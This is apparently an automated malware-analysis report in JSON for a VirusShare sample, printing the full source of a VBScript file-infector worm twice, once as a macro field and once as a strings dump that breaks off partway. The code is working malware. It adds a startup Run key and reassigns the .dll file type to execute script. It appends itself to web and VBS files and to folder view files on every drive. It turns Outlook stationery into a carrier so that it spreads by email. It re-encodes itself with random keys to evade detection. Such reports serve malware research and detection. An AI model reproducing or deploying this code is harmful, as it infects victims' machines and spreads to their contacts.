{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "Command": "May run PowerShell commands",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "SYSTEM": "May run an executable file or a system command on a Mac",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "ThisText\t\"Dim InWhere,HtmlText,VbsText,DegreeSign,AppleObject,FSO,WsShell,WinPath,SubE,FinalyDisk\nSub KJ_start()\nKJSetDim()\nKJCreateMilieu()\nKJLikeIt()\nKJCreateMail()\nKJPropagate()\nEnd Sub\n\nFunction KJAppendTo(FilePath,TypeStr)\nOn Error Resume Next\nSet ReadTemp = FSO.OpenTextFile(FilePath,1)\nTmpStr = ReadTemp.ReadAll\nIf Instr(TmpStr,\"\"KJ_start()\"\") <> 0 Or Len(TmpStr) < 1 Then\nReadTemp.Close\nExit Function\nEnd If\nIf TypeStr = \"\"htt\"\" Then\nReadTemp.Close\nSet FileTemp = FSO.OpenTextFile(FilePath,2)\nFileTemp.Write \"\"<\"\" & \"\"BODY onload=\"\"\"\"\"\" & \"\"vbscript:\"\" & \"\"KJ_start()\"\"\"\"\"\" & \"\">\"\" & vbCrLf & TmpStr & vbCrLf & HtmlText\nFileTemp.Close\nSet FAttrib = FSO.GetFile(FilePath)\nFAttrib.attributes = 34\nElse\nReadTemp.Close\nSet FileTemp = FSO.OpenTextFile(FilePath,8)\nIf TypeStr = \"\"html\"\" Then\nFileTemp.Write vbCrLf & \"\"<\"\" & \"\"HTML>\"\" & vbCrLf & \"\"<\"\" & \"\"BODY onload=\"\"\"\"\"\" & \"\"vbscript:\"\" & \"\"KJ_start()\"\"\"\"\"\" & \"\">\"\" & vbCrLf & HtmlText\nElseIf TypeStr = \"\"vbs\"\" Then\nFileTemp.Write vbCrLf & VbsText\nEnd If\nFileTemp.Close\nEnd If\nEnd Function\n\nFunction KJChangeSub(CurrentString,LastIndexChar)\nIf LastIndexChar = 0 Then\nIf Left(LCase(CurrentString),1) =< LCase(\"\"c\"\") Then\nKJChangeSub = FinalyDisk & \"\":\\\"\"\nSubE = 0\nElse\nKJChangeSub = Chr(Asc(Left(LCase(CurrentString),1)) - 1) & \"\":\\\"\"\nSubE = 0\nEnd If\nElse\nKJChangeSub = Mid(CurrentString,1,LastIndexChar)\nEnd If\nEnd Function\n\nFunction KJCreateMail()\nOn Error Resume Next\nIf InWhere = \"\"html\"\" Then\nExit Function\nEnd If\nShareFile = Left(WinPath,3) & \"\"Program Files\\Common Files\\Microsoft Shared\\Stationery\\blank.htm\"\"\nIf (FSO.FileExists(ShareFile)) Then\nCall KJAppendTo(ShareFile,\"\"html\"\")\nElse\nSet FileTemp = FSO.OpenTextFile(ShareFile,2,true)\nFileTemp.Write \"\"<\"\" & \"\"HTML>\"\" & vbCrLf & \"\"<\"\" & \"\"BODY onload=\"\"\"\"\"\" & \"\"vbscript:\"\" & \"\"KJ_start()\"\"\"\"\"\" & \"\">\"\" & vbCrLf & HtmlText\nFileTemp.Close\nEnd If\nDefaultId = WsShell.RegRead(\"\"HKEY_CURRENT_USER\\Identities\\Default User ID\"\")\nOutLookVersion = WsShell.RegRead(\"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\MediaVer\"\")\nWsShell.RegWrite \"\"HKEY_CURRENT_USER\\Identities\\\"\"&DefaultId&\"\"\\Software\\Microsoft\\Outlook Express\\\"\"& Left(OutLookVersion,1) &\"\".0\\Mail\\Compose Use Stationery\"\",1,\"\"REG_DWORD\"\"\nCall KJMailReg(\"\"HKEY_CURRENT_USER\\Identities\\\"\"&DefaultId&\"\"\\Software\\Microsoft\\Outlook Express\\\"\"& Left(OutLookVersion,1) &\"\".0\\Mail\\Stationery Name\"\",ShareFile)\nCall KJMailReg(\"\"HKEY_CURRENT_USER\\Identities\\\"\"&DefaultId&\"\"\\Software\\Microsoft\\Outlook Express\\\"\"& Left(OutLookVersion,1) &\"\".0\\Mail\\Wide Stationery Name\"\",ShareFile)\nWsShell.RegWrite \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Outlook\\Options\\Mail\\EditorPreference\"\",131072,\"\"REG_DWORD\"\"\nCall KJMailReg(\"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\"\",\"\"blank\"\")\nCall KJMailReg(\"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\"\",\"\"blank\"\")\nWsShell.RegWrite \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Outlook\\Options\\Mail\\EditorPreference\"\",131072,\"\"REG_DWORD\"\"\nCall KJMailReg(\"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Common\\MailSettings\\NewStationery\"\",\"\"blank\"\")\nKJummageFolder(Left(WinPath,3) & \"\"Program Files\\Common Files\\Microsoft Shared\\Stationery\"\")\nEnd Function\n\nFunction KJCreateMilieu()\nOn Error Resume Next\nTempPath = \"\"\"\"\nIf Not(FSO.FileExists(WinPath & \"\"WScript.exe\"\")) Then\nTempPath = \"\"system32\\\"\"\nEnd If\nIf TempPath = \"\"system32\\\"\" Then\nStartUpFile = WinPath & \"\"SYSTEM\\Kernel32.dll\"\"\nElse\nStartUpFile = WinPath & \"\"SYSTEM\\Kernel.dll\"\"\nEnd If\nWsShell.RegWrite \"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Kernel32\"\",StartUpFile\nFSO.CopyFile WinPath & \"\"web\\kjwall.gif\"\",WinPath & \"\"web\\Folder.htt\"\"\nFSO.CopyFile WinPath & \"\"system32\\kjwall.gif\"\",WinPath & \"\"system32\\desktop.ini\"\"\nCall KJAppendTo(WinPath & \"\"web\\Folder.htt\"\",\"\"htt\"\")\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\.dll\\\"\",\"\"dllfile\"\"\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\.dll\\Content Type\"\",\"\"application/x-msdownload\"\"\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllfile\\DefaultIcon\\\"\",WsShell.RegRead(\"\"HKEY_CLASSES_ROOT\\vxdfile\\DefaultIcon\\\"\")\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllfile\\ScriptEngine\\\"\",\"\"VBScript\"\"\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllFile\\Shell\\Open\\Command\\\"\",WinPath & TempPath & \"\"WScript.exe \"\"\"\"%1\"\"\"\" %*\"\"\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllFile\\ShellEx\\PropertySheetHandlers\\WSHProps\\\"\",\"\"{60254CA5-953B-11CF-8C96-00AA00B8708C}\"\"\nWsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllFile\\ScriptHostEncode\\\"\",\"\"{85131631-480C-11D2-B1F9-00C04F86C324}\"\"\nSet FileTemp = FSO.OpenTextFile(StartUpFile,2,true)\nFileTemp.Write VbsText\nFileTemp.Close\nEnd Function\n\nFunction KJLikeIt()\nIf InWhere <> \"\"html\"\" Then\nExit Function\nEnd If\nThisLocation = document.location\nIf Left(ThisLocation, 4) = \"\"file\"\" Then\nThisLocation = Mid(ThisLocation,9)\nIf FSO.GetExtensionName(ThisLocation) <> \"\"\"\" then\nThisLocation = Left(ThisLocation,Len(ThisLocation) - Len(FSO.GetFileName(ThisLocation)))\nEnd If\nIf Len(ThisLocation) > 3 Then\nThisLocation = ThisLocation & \"\"\\\"\"\nEnd If\nKJummageFolder(ThisLocation)\nEnd If\nEnd Function\n\nFunction KJMailReg(RegStr,FileName)\nOn Error Resume Next\nRegTempStr = WsShell.RegRead(RegStr)\nIf RegTempStr = \"\"\"\" Then\nWsShell.RegWrite RegStr,FileName\nEnd If\nEnd Function\n\nFunction KJOboSub(CurrentString)\nSubE = 0\nTestOut = 0\nDo While True\nTestOut = TestOut + 1\nIf TestOut > 28 Then\nCurrentString = FinalyDisk & \"\":\\\"\"\nExit Do\nEnd If\nOn Error Resume Next\nSet ThisFolder = FSO.GetFolder(CurrentString)\nSet DicSub = CreateObject(\"\"Scripting.Dictionary\"\")\nSet Folders = ThisFolder.SubFolders\nFolderCount = 0\nFor Each TempFolder in Folders\nFolderCount = FolderCount + 1\nDicSub.add FolderCount, TempFolder.Name\nNext\nIf DicSub.Count = 0 Then\nLastIndexChar = InstrRev(CurrentString,\"\"\\\"\",Len(CurrentString)-1)\nSubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)\nCurrentString = KJChangeSub(CurrentString,LastIndexChar)\nSubE = 1\nElse\nIf SubE = 0 Then\nCurrentString = CurrentString & DicSub.Item(1) & \"\"\\\"\"\nExit Do\nElse\nj = 0\nFor j = 1 To FolderCount\nIf LCase(SubString) = LCase(DicSub.Item(j)) Then\nIf j < FolderCount Then\nCurrentString = CurrentString & DicSub.Item(j+1) & \"\"\\\"\"\nExit Do\nEnd If\nEnd If\nNext\nLastIndexChar = InstrRev(CurrentString,\"\"\\\"\",Len(CurrentString)-1)\nSubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)\nCurrentString = KJChangeSub(CurrentString,LastIndexChar)\nEnd If\nEnd If\nLoop\nKJOboSub = CurrentString\nEnd Function\n\nFunction KJPropagate()\nOn Error Resume Next\nRegPathValue = \"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\Degree\"\"\nDiskDegree = WsShell.RegRead(RegPathValue)\nIf DiskDegree = \"\"\"\" Then\nDiskDegree = FinalyDisk & \"\":\\\"\"\nEnd If\nFor i=1 to 5\nDiskDegree = KJOboSub(DiskDegree)\nKJummageFolder(DiskDegree)\nNext\nWsShell.RegWrite RegPathValue,DiskDegree\nEnd Function\n\nFunction KJummageFolder(PathName)\nOn Error Resume Next\nSet FolderName = FSO.GetFolder(PathName)\nSet ThisFiles = FolderName.Files\nHttExists = 0\nFor Each ThisFile In ThisFiles\nFileExt = UCase(FSO.GetExtensionName(ThisFile.Path))\nIf FileExt = \"\"HTM\"\" Or FileExt = \"\"HTML\"\" Or FileExt = \"\"ASP\"\" Or FileExt = \"\"PHP\"\" Or FileExt = \"\"JSP\"\" Then\nCall KJAppendTo(ThisFile.Path,\"\"html\"\")\nElseIf FileExt = \"\"VBS\"\" Then\nCall KJAppendTo(ThisFile.Path,\"\"vbs\"\")\nElseIf FileExt = \"\"HTT\"\" Then\nHttExists = 1\nEnd If\nNext\nIf (UCase(PathName) = UCase(WinPath & \"\"Desktop\\\"\")) Or (UCase(PathName) = UCase(WinPath & \"\"Desktop\"\"))Then\nHttExists = 1\nEnd If\nIf HttExists = 0 Then\nFSO.CopyFile WinPath & \"\"system32\\desktop.ini\"\",PathName\nFSO.CopyFile WinPath & \"\"web\\Folder.htt\"\",PathName\nEnd If\nEnd Function\n\nFunction KJSetDim()\nOn Error Resume Next\nErr.Clear\nTestIt = WScript.ScriptFullname\nIf Err Then\nInWhere = \"\"html\"\"\nElse\nInWhere = \"\"vbs\"\"\nEnd If\nIf InWhere = \"\"vbs\"\" Then\nSet FSO = CreateObject(\"\"Scripting.FileSystemObject\"\")\nSet WsShell = CreateObject(\"\"WScript.Shell\"\")\nElse\nSet AppleObject = document.applets(\"\"KJ_guest\"\")\nAppleObject.setCLSID(\"\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\"\")\nAppleObject.createInstance()\nSet WsShell = AppleObject.GetObject()\nAppleObject.setCLSID(\"\"{0D43FE01-F093-11CF-8940-00A0C9054228}\"\")\nAppleObject.createInstance()\nSet FSO = AppleObject.GetObject()\nEnd If\nSet DiskObject = FSO.Drives\nFor Each DiskTemp In DiskObject\nIf DiskTemp.DriveType <> 2 And DiskTemp.DriveType <> 1 Then\nExit For\nEnd If\nFinalyDisk = DiskTemp.DriveLetter\nNext\nDim OtherArr(3)\nRandomize\nFor i=0 To 3\nOtherArr(i) = Int((9 * Rnd))\nNext\nTempString = \"\"\"\"\nFor i=1 To Len(ThisText)\nTempNum = Asc(Mid(ThisText,i,1))\nIf TempNum = 13 Then\nTempNum = 28\nElseIf TempNum = 10 Then\nTempNum = 29\nEnd If\nTempChar = Chr(TempNum - OtherArr(i Mod 4))\nIf TempChar = Chr(34) Then\nTempChar = Chr(18)\nEnd If\nTempString = TempString & TempChar\nNext\nUnLockStr = \"\"Execute(\"\"\"\"Dim KeyArr(3),ThisText\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(0) = \"\" & OtherArr(0) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(1) = \"\" & OtherArr(1) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(2) = \"\" & OtherArr(2) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"KeyArr(3) = \"\" & OtherArr(3) & \"\"\"\"\"\"&vbCrLf&\"\"\"\"For i=1 To Len(ExeString)\"\"\"\"&vbCrLf&\"\"\"\"TempNum = Asc(Mid(ExeString,i,1))\"\"\"\"&vbCrLf&\"\"\"\"If TempNum = 18 Then\"\"\"\"&vbCrLf&\"\"\"\"TempNum = 34\"\"\"\"&vbCrLf&\"\"\"\"End If\"\"\"\"&vbCrLf&\"\"\"\"TempChar = Chr(TempNum + KeyArr(i Mod 4))\"\"\"\"&vbCrLf&\"\"\"\"If TempChar = Chr(28) Then\"\"\"\"&vbCrLf&\"\"\"\"TempChar = vbCr\"\"\"\"&vbCrLf&\"\"\"\"ElseIf TempChar = Chr(29) Then\"\"\"\"&vbCrLf&\"\"\"\"TempChar = vbLf\"\"\"\"&vbCrLf&\"\"\"\"End If\"\"\"\"&vbCrLf&\"\"\"\"ThisText = ThisText & TempChar\"\"\"\"&vbCrLf&\"\"\"\"Next\"\"\"\")\"\" & vbCrLf & \"\"Execute(ThisText)\"\"\nThisText = \"\"ExeString = \"\"\"\"\"\" & TempString & \"\"\"\"\"\"\"\"\nHtmlText =\"\"<\"\" & \"\"script language=vbscript>\"\" & vbCrLf & \"\"document.write \"\" & \"\"\"\"\"\"\"\" & \"\"<\"\" & \"\"div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>\"\" & \"\"<\"\"\"\"&\"\"\"\"\"\" & \"\"APPLET NAME=KJ\"\"\"\"&\"\"\"\"_guest HEIGHT=0 WIDTH=0 code=com.ms.\"\"\"\"&\"\"\"\"activeX.Active\"\"\"\"&\"\"\"\"XComponent>\"\" & \"\"<\"\" & \"\"/APPLET>\"\" & \"\"<\"\" & \"\"/div>\"\"\"\"\"\" & vbCrLf & \"\"<\"\" & \"\"/script>\"\" & vbCrLf & \"\"<\"\" & \"\"script language=vbscript>\"\" & vbCrLf & ThisText & vbCrLf & UnLockStr & vbCrLf & \"\"<\"\" & \"\"/script>\"\" & vbCrLf & \"\"<\"\" & \"\"/BODY>\"\" & vbCrLf & \"\"<\"\" & \"\"/HTML>\"\"\nVbsText = ThisText & vbCrLf & UnLockStr & vbCrLf & \"\"KJ_start()\"\"\nWinPath = FSO.GetSpecialFolder(0) & \"\"\\\"\"\nIf (FSO.FileExists(WinPath & \"\"web\\Folder.htt\"\")) Then\nFSO.CopyFile WinPath & \"\"web\\Folder.htt\"\",WinPath & \"\"web\\kjwall.gif\"\"\nEnd If\nIf (FSO.FileExists(WinPath & \"\"system32\\desktop.ini\"\")) Then\nFSO.CopyFile WinPath & \"\"system32\\desktop.ini\"\",WinPath & \"\"system32\\kjwall.gif\"\"\nEnd If\nEnd Function\"\tString"
    },
    "filename": "VirusShare_39a13b7bfb9055e21587bf242d0f0e3f",
    "filesize": 11033,
    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "39a13b7bfb9055e21587bf242d0f0e3f",
        "sha1": "982fe3bd8dd3fec537ac82b75667cae8a88426f8",
        "sha256": "0dc625e54228f6ac4b3adf9c0c6e6c558e7486f1defb2a4ca5978042df73141a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "ThisText\t\"Dim InWhere,HtmlText,VbsText,DegreeSign,AppleObject,FSO,WsShell,WinPath,SubE,FinalyDisk",
            "Sub KJ_start()",
            "KJSetDim()",
            "KJCreateMilieu()",
            "KJLikeIt()",
            "KJCreateMail()",
            "KJPropagate()",
            "End Sub",
            "Function KJAppendTo(FilePath,TypeStr)",
            "On Error Resume Next",
            "Set ReadTemp = FSO.OpenTextFile(FilePath,1)",
            "TmpStr = ReadTemp.ReadAll",
            "If Instr(TmpStr,\"\"KJ_start()\"\") <> 0 Or Len(TmpStr) < 1 Then",
            "ReadTemp.Close",
            "Exit Function",
            "End If",
            "If TypeStr = \"\"htt\"\" Then",
            "ReadTemp.Close",
            "Set FileTemp = FSO.OpenTextFile(FilePath,2)",
            "FileTemp.Write \"\"<\"\" & \"\"BODY onload=\"\"\"\"\"\" & \"\"vbscript:\"\" & \"\"KJ_start()\"\"\"\"\"\" & \"\">\"\" & vbCrLf & TmpStr & vbCrLf & HtmlText",
            "FileTemp.Close",
            "Set FAttrib = FSO.GetFile(FilePath)",
            "FAttrib.attributes = 34",
            "Else",
            "ReadTemp.Close",
            "Set FileTemp = FSO.OpenTextFile(FilePath,8)",
            "If TypeStr = \"\"html\"\" Then",
            "FileTemp.Write vbCrLf & \"\"<\"\" & \"\"HTML>\"\" & vbCrLf & \"\"<\"\" & \"\"BODY onload=\"\"\"\"\"\" & \"\"vbscript:\"\" & \"\"KJ_start()\"\"\"\"\"\" & \"\">\"\" & vbCrLf & HtmlText",
            "ElseIf TypeStr = \"\"vbs\"\" Then",
            "FileTemp.Write vbCrLf & VbsText",
            "End If",
            "FileTemp.Close",
            "End If",
            "End Function",
            "Function KJChangeSub(CurrentString,LastIndexChar)",
            "If LastIndexChar = 0 Then",
            "If Left(LCase(CurrentString),1) =< LCase(\"\"c\"\") Then",
            "KJChangeSub = FinalyDisk & \"\":\\\"\"",
            "SubE = 0",
            "Else",
            "KJChangeSub = Chr(Asc(Left(LCase(CurrentString),1)) - 1) & \"\":\\\"\"",
            "SubE = 0",
            "End If",
            "Else",
            "KJChangeSub = Mid(CurrentString,1,LastIndexChar)",
            "End If",
            "End Function",
            "Function KJCreateMail()",
            "On Error Resume Next",
            "If InWhere = \"\"html\"\" Then",
            "Exit Function",
            "End If",
            "ShareFile = Left(WinPath,3) & \"\"Program Files\\Common Files\\Microsoft Shared\\Stationery\\blank.htm\"\"",
            "If (FSO.FileExists(ShareFile)) Then",
            "Call KJAppendTo(ShareFile,\"\"html\"\")",
            "Else",
            "Set FileTemp = FSO.OpenTextFile(ShareFile,2,true)",
            "FileTemp.Write \"\"<\"\" & \"\"HTML>\"\" & vbCrLf & \"\"<\"\" & \"\"BODY onload=\"\"\"\"\"\" & \"\"vbscript:\"\" & \"\"KJ_start()\"\"\"\"\"\" & \"\">\"\" & vbCrLf & HtmlText",
            "FileTemp.Close",
            "End If",
            "DefaultId = WsShell.RegRead(\"\"HKEY_CURRENT_USER\\Identities\\Default User ID\"\")",
            "OutLookVersion = WsShell.RegRead(\"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\MediaVer\"\")",
            "WsShell.RegWrite \"\"HKEY_CURRENT_USER\\Identities\\\"\"&DefaultId&\"\"\\Software\\Microsoft\\Outlook Express\\\"\"& Left(OutLookVersion,1) &\"\".0\\Mail\\Compose Use Stationery\"\",1,\"\"REG_DWORD\"\"",
            "Call KJMailReg(\"\"HKEY_CURRENT_USER\\Identities\\\"\"&DefaultId&\"\"\\Software\\Microsoft\\Outlook Express\\\"\"& Left(OutLookVersion,1) &\"\".0\\Mail\\Stationery Name\"\",ShareFile)",
            "Call KJMailReg(\"\"HKEY_CURRENT_USER\\Identities\\\"\"&DefaultId&\"\"\\Software\\Microsoft\\Outlook Express\\\"\"& Left(OutLookVersion,1) &\"\".0\\Mail\\Wide Stationery Name\"\",ShareFile)",
            "WsShell.RegWrite \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Outlook\\Options\\Mail\\EditorPreference\"\",131072,\"\"REG_DWORD\"\"",
            "Call KJMailReg(\"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\"\",\"\"blank\"\")",
            "Call KJMailReg(\"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Microsoft Outlook Internet Settings\\0a0d020000000000c000000000000046\\001e0360\"\",\"\"blank\"\")",
            "WsShell.RegWrite \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Outlook\\Options\\Mail\\EditorPreference\"\",131072,\"\"REG_DWORD\"\"",
            "Call KJMailReg(\"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Common\\MailSettings\\NewStationery\"\",\"\"blank\"\")",
            "KJummageFolder(Left(WinPath,3) & \"\"Program Files\\Common Files\\Microsoft Shared\\Stationery\"\")",
            "End Function",
            "Function KJCreateMilieu()",
            "On Error Resume Next",
            "TempPath = \"\"\"\"",
            "If Not(FSO.FileExists(WinPath & \"\"WScript.exe\"\")) Then",
            "TempPath = \"\"system32\\\"\"",
            "End If",
            "If TempPath = \"\"system32\\\"\" Then",
            "StartUpFile = WinPath & \"\"SYSTEM\\Kernel32.dll\"\"",
            "Else",
            "StartUpFile = WinPath & \"\"SYSTEM\\Kernel.dll\"\"",
            "End If",
            "WsShell.RegWrite \"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Kernel32\"\",StartUpFile",
            "FSO.CopyFile WinPath & \"\"web\\kjwall.gif\"\",WinPath & \"\"web\\Folder.htt\"\"",
            "FSO.CopyFile WinPath & \"\"system32\\kjwall.gif\"\",WinPath & \"\"system32\\desktop.ini\"\"",
            "Call KJAppendTo(WinPath & \"\"web\\Folder.htt\"\",\"\"htt\"\")",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\.dll\\\"\",\"\"dllfile\"\"",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\.dll\\Content Type\"\",\"\"application/x-msdownload\"\"",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllfile\\DefaultIcon\\\"\",WsShell.RegRead(\"\"HKEY_CLASSES_ROOT\\vxdfile\\DefaultIcon\\\"\")",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllfile\\ScriptEngine\\\"\",\"\"VBScript\"\"",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllFile\\Shell\\Open\\Command\\\"\",WinPath & TempPath & \"\"WScript.exe \"\"\"\"%1\"\"\"\" %*\"\"",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllFile\\ShellEx\\PropertySheetHandlers\\WSHProps\\\"\",\"\"{60254CA5-953B-11CF-8C96-00AA00B8708C}\"\"",
            "WsShell.RegWrite \"\"HKEY_CLASSES_ROOT\\dllFile\\ScriptHostEncode\\\"\",\"\"{85131631-480C-11D2-B1F9-00C04F86C324}\"\"",
            "Set FileTemp = FSO.OpenTextFile(StartUpFile,2,true)",
            "FileTemp.Write VbsText",
            "FileTemp.Close",
            "End Function",
            "Function KJLikeIt()",
            "If InWhere <> \"\"html\"\" Then",
            "Exit Function",
            "End If",
            "ThisLocation = document.location",
            "If Left(ThisLocation, 4) = \"\"file\"\" Then",
            "ThisLocation = Mid(ThisLocation,9)",
            "If FSO.GetExtensionName(ThisLocation) <> \"\"\"\" then",
            "ThisLocation = Left(ThisLocation,Len(ThisLocation) - Len(FSO.GetFileName(ThisLocation)))",
            "End If",
            "If Len(ThisLocation) > 3 Then",
            "ThisLocation = ThisLocation & \"\"\\\"\"",
            "End If",
            "KJummageFolder(ThisLocation)",
            "End If",
            "End Function",
            "Function KJMailReg(RegStr,FileName)",
            "On Error Resume Next",
            "RegTempStr = WsShell.RegRead(RegStr)",
            "If RegTempStr = \"\"\"\" Then",
            "WsShell.RegWrite RegStr,FileName",
            "End If",
            "End Function",
            "Function KJOboSub(CurrentString)",
            "SubE = 0",
            "TestOut = 0",
            "Do While True",
            "TestOut = TestOut + 1",
            "If TestOut > 28 Then",
            "CurrentString = FinalyDisk & \"\":\\\"\"",
            "Exit Do",
            "End If",
            "On Error Resume Next",
            "Set ThisFolder = FSO.GetFolder(CurrentString)",
            "Set DicSub = CreateObject(\"\"Scripting.Dictionary\"\")",
            "Set Folders = ThisFolder.SubFolders",
            "FolderCount = 0",
            "For Each TempFolder in Folders",
            "FolderCount = FolderCount + 1",
            "DicSub.add FolderCount, TempFolder.Name",
            "Next",
            "If DicSub.Count = 0 Then",
            "LastIndexChar = InstrRev(CurrentString,\"\"\\\"\",Len(CurrentString)-1)",
            "SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)",
            "CurrentString = KJChangeSub(CurrentString,LastIndexChar)",
            "SubE = 1",
            "Else",
            "If SubE = 0 Then",
            "CurrentString = CurrentString & DicSub.Item(1) & \"\"\\\"\"",
            "Exit Do",
            "Else",
            "j = 0",
            "For j = 1 To FolderCount",
            "If LCase(SubString) = LCase(DicSub.Item(j)) Then",
            "If j < FolderCount Then",
            "CurrentString = CurrentString & DicSub.Item(j+1) & \"\"\\\"\"",
            "Exit Do",
            "End If",
            "End If",
            "Next",
            "LastIndexChar = InstrRev(CurrentString,\"\"\\\"\",Len(CurrentString)-1)",
            "SubString = Mid(CurrentString,LastIndexChar+1,Len(CurrentString)-LastIndexChar-1)",
            "CurrentString = KJChangeSub(CurrentString,LastIndexChar)",
            "End If",
            "End If",
            "Loop",
            "KJOboSub = CurrentString",
            "End Function",
            "Function KJPropagate()",
            "On Error Resume Next",
            "RegPathValue = \"\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Outlook Express\\Degree\"\"",
            "DiskDegree = WsShell.RegRead(RegPathValue)",
            "If DiskDegree = \"\"\"\" Then",
            "DiskDegree = FinalyDisk & \"\":\\\"\"",
            "End If",
            "For i=1 to 5",
            "DiskDegree = KJOboSub(DiskDegree)",
            "KJummageFolder(DiskDegree)",
            "Next",
            "WsShell.RegWrite RegPathValue,DiskDegree",
            "End Function",
            "Function KJummageFolder(PathName)",
            "On Error Resume Next",
            "Set FolderName = FSO.GetFolder(PathName)",
            "Set ThisFiles = FolderName.Files",
            "HttExists = 0",
            "For Each ThisFile In ThisFiles",
            "FileExt = UCase(FSO.GetExtensionName(ThisFile.Path))",
            "If FileExt = \"\"HTM\"\" Or FileExt = \"\"HTML\"\" Or FileExt = \"\"ASP\"\" Or FileExt = \"\"PHP\"\" Or FileExt = \"\"JSP\"\" Then",
            "Call KJAppendTo(ThisFile.Path,\"\"html\"\")",
            "ElseIf FileExt = \"\"VBS\"\" Then",
            "Call KJAppendTo(ThisFile.Path,\"\"vbs\"\")",
            "ElseIf FileExt = \"\"HTT\"\" Then",
            "HttExists = 1",
            "End If",
            "Next",
            "If (UCase(PathName) = UCase(WinPath & \"\"Desktop\\\"\")) Or (UCase(PathName) = UCase(WinPath & \"\"Desktop\"\"))Then",
            "HttExists = 1",
            "End If",
            "If HttExists = 0 Then",
            "FSO.CopyFile WinPath & \"\"system32\\desktop.ini\"\",PathName",
            "FSO.CopyFile WinPath & \"\"web\\Folder.htt\"\",PathName",
            "End If",
            "End Function",
            "Function KJSetDim()",
            "On Error Resume Next",
            "Err.Clear",
            "TestIt = WScript.ScriptFullname",
            "If Err Then",
            "InWhere = \"\"html\"\"",
            "Else",
            "InWhere = \"\"vbs\"\"",
            "End If",
            "If InWhere = \"\"vbs\"\" Then",
            "Set FSO = CreateObject(\"\"Scripting.FileSystemObject\"\")",
            "Set WsShell = CreateObject(\"\"WScript.Shell\"\")",
            "Else",
            "Set AppleObject = document.applets(\"\"KJ_guest\"\")",
            "AppleObject.setCLSID(\"\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\"\")",
            "AppleObject.createInstance()",
            "Set WsShell = AppleObject.GetObject()",
            "AppleObject.setCLSID(\"\"{0D43FE01-F093-11CF-8940-00A0C9054228}\"\")",
            "AppleObject.createInstance()",
            "Set FSO = AppleObject.GetObject()",
            "End If",
            "Set DiskObject = FSO.Drives",
            "For Each DiskTemp In DiskObject",
            "If DiskTemp.DriveType <> 2 And DiskTemp.DriveType <> 1 Then",
            "Exit For",
            "End If",
            "FinalyDisk = DiskTemp.DriveLetter",
            "Next",
            "Dim OtherArr(3)",
            "Randomize",
            "For i=0 To 3",
            "OtherArr(i) = Int((9 * Rnd))",
            "Next",
            "TempString = \"\"\"\"",
            "For i=1 To Len(ThisText)",
            "TempNum = Asc(Mid(ThisText,i,1))",
            "If TempNum = 13 Then",
            "TempNum = 28",
            "ElseIf TempNum = 10 Then",
            "TempNum = 29",
            "End If",
            "TempChar = Chr(TempNum - OtherArr(i Mod 4))",
            "If TempChar = Chr(34) Then",
            "TempChar = Chr(18)",
            "End If",
            "TempString = TempString & TempChar",
            "Next",
